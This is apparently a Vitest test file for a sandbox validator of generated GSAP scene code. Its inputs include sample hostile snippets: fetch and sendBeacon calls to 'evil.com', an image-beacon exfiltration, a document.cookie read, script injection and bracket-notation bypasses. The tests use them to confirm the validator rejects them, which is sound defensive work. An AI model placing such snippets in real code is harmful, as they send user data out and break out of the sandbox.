import { describe, it, expect } from 'vitest';
import { validateSceneCode } from '../src/engine/composition/validator';

describe('Composition Code Validator', () => {
  it('allows safe GSAP timeline manipulation and scoped CSS', () => {
    const validCode = {
      html: '<div class="banner"><h1>Hello World</h1></div>',
      css: '.banner { width: 100%; height: 100%; display: flex; }',
      buildJs: 'tl.from(root.querySelector(".banner"), { opacity: 0, duration: 0.5 });'
    };
    const result = validateSceneCode(validCode);
    expect(result.valid).toBe(true);
    expect(result.errors.length).toBe(0);
  });

  it('rejects non-deterministic Math.random() usage', () => {
    const code = {
      html: '<div></div>',
      buildJs: 'const r = Math.random(); tl.to(root, { x: r * 100 });'
    };
    const result = validateSceneCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes('Math.random'))).toBe(true);
  });

  it('rejects network calls like fetch and XMLHttpRequest', () => {
    const code = {
      html: '<div></div>',
      buildJs: 'fetch("https://evil.com"); tl.to(root, { opacity: 1 });'
    };
    const result = validateSceneCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes('fetch'))).toBe(true);
  });

  it('rejects script tags inside HTML snippet', () => {
    const code = {
      html: '<div><script>alert(1)</script></div>',
      buildJs: 'tl.to(root, { opacity: 1 });'
    };
    const result = validateSceneCode(code);
    expect(result.valid).toBe(false);
    expect(result.errors.some((e) => e.includes('script'))).toBe(true);
  });

  it('rejects dynamic import() and Function constructor', () => {
    const dynImport = validateSceneCode({
      buildJs: 'import("malicious.js"); tl.to(root, { opacity: 1 });'
    });
    expect(dynImport.valid).toBe(false);
    expect(dynImport.errors.some((e) => e.includes('import'))).toBe(true);

    const fnConstructor = validateSceneCode({
      buildJs: 'const f = new Function("alert(1)"); f(); tl.to(root, { opacity: 1 });'
    });
    expect(fnConstructor.valid).toBe(false);
    expect(fnConstructor.errors.some((e) => e.includes('Function'))).toBe(true);
  });

  it('rejects window traversal and global escape vectors (parent, top, window.parent, globalThis)', () => {
    for (const snippet of [
      'parent.postMessage("leak"); tl.to(root, { opacity: 1 });',
      'window.parent.location = "x"; tl.to(root, { opacity: 1 });',
      'top.location = "x"; tl.to(root, { opacity: 1 });',
      'top["location"] = "x"; tl.to(root, { opacity: 1 });',
      'globalThis.evil = true; tl.to(root, { opacity: 1 });'
    ]) {
      const res = validateSceneCode({ buildJs: snippet });
      expect(res.valid).toBe(false);
      expect(res.errors.length).toBeGreaterThan(0);
    }
  });

  it('rejects client storage and exfiltration APIs (document.cookie, storage, indexedDB, sendBeacon, new Image)', () => {
    for (const snippet of [
      'const c = document.cookie; tl.to(root, { opacity: 1 });',
      'localStorage.setItem("x", "1"); tl.to(root, { opacity: 1 });',
      'sessionStorage.getItem("x"); tl.to(root, { opacity: 1 });',
      'indexedDB.open("db"); tl.to(root, { opacity: 1 });',
      'navigator.sendBeacon("https://evil.com"); tl.to(root, { opacity: 1 });',
      'const img = new Image(); img.src = "https://evil.com"; tl.to(root, { opacity: 1 });'
    ]) {
      const res = validateSceneCode({ buildJs: snippet });
      expect(res.valid).toBe(false);
      expect(res.errors.length).toBeGreaterThan(0);
    }
  });

  it('rejects bracket notation bypasses for protected keywords', () => {
    for (const snippet of [
      'window["fetch"]("x"); tl.to(root, { opacity: 1 });',
      'window[\'eval\']("x"); tl.to(root, { opacity: 1 });',
      'window[`parent`].focus(); tl.to(root, { opacity: 1 });',
      'window["top"].focus(); tl.to(root, { opacity: 1 });'
    ]) {
      const res = validateSceneCode({ buildJs: snippet });
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('bracket'))).toBe(true);
    }
  });

  it('rejects performance.now() for non-deterministic timing', () => {
    const res = validateSceneCode({
      buildJs: 'const t = performance.now(); tl.to(root, { x: t });'
    });
    expect(res.valid).toBe(false);
    expect(res.errors.some((e) => e.includes('performance.now'))).toBe(true);
  });

  it('allows harmless DOM variables named parent or top without false positive security rejection', () => {
    const validDOMCode = {
      html: '<div class="parent"><div class="card"></div></div>',
      css: '.parent { width: 100%; height: 100%; }',
      buildJs: `
        const parent = root.querySelector('.parent');
        const card = document.createElement('div');
        parent.appendChild(card);
        const topBar = root.querySelector('.top');
        const top = 50;
        tl.to(parent, { opacity: 1, duration: 0.5 });
      `
    };
    const res = validateSceneCode(validDOMCode);
    expect(res.valid).toBe(true);
    expect(res.errors.length).toBe(0);
  });

  it('tolerates accidental redeclarations of tl or root without throwing identifier already declared syntax error', () => {
    const codeWithRedecl = {
      html: '<div class="box"></div>',
      css: '.box { width: 50px; height: 50px; }',
      buildJs: `
        const tl = gsap.timeline();
        const root = document.querySelector('.box');
        tl.to(root, { scale: 1.5, duration: 0.8 });
      `
    };
    const res = validateSceneCode(codeWithRedecl);
    expect(res.valid).toBe(true);
    expect(res.errors.length).toBe(0);
  });
});

